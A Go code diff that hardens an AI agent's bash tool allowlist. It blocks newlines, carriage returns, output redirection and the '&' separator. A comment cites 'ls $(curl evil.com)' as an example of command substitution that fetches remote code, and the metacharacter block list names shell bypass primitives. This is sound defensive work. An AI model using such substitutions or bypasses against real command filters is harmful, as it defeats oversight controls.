@@ -132,10 +132,12 @@ func extractCommands(cmd string) []string {
 		// Find the earliest operator
 		minIdx := len(remaining)
 		opLen := 0
-		for _, op := range []string{"&&", "||", "|", ";"} {
-			if idx := strings.Index(remaining, op); idx != -1 && idx < minIdx {
-				minIdx = idx
-				opLen = len(op)
+		for _, op := range []string{"&&", "||", "|", ";", "&"} {
+			if idx := strings.Index(remaining, op); idx != -1 {
+				if idx < minIdx || (idx == minIdx && len(op) > opLen) {
+					minIdx = idx
+					opLen = len(op)
+				}
 			}
 		}
 
@@ -190,9 +192,14 @@ func (t *BashTool) Execute(ctx context.Context, input json.RawMessage) (tool.Too
 		case "deny":
 			return tool.ToolResult{Error: "bash execution is disabled by policy"}, nil
 		case "allowlist":
-			// Block shell metacharacters that can execute arbitrary code
-			// inside an otherwise-allowed command (e.g. ls $(curl evil.com))
-			for _, meta := range []string{"$(", "`", "<(", ">(", "${", "\\n"} {
+			// Block shell metacharacters that can execute arbitrary code or
+			// write files inside an otherwise-allowed command. Covers command
+			// substitution (e.g. ls $(curl evil.com)), real newline/CR bytes
+			// (bash -c treats them as command separators, so trailing lines
+			// would run unvalidated), and output redirection (">" matches ">",
+			// ">>", "2>", "&>", "2>&1" — all write/overwrite primitives).
+			// Input redirection "<" is intentionally allowed (not a write/exec bypass).
+			for _, meta := range []string{"$(", "`", "<(", ">(", "${", "\n", "\r", ">"} {
 				if strings.Contains(in.Command, meta) {
 					return tool.ToolResult{Error: "command contains shell metacharacters not allowed in allowlist mode"}, nil
 				}
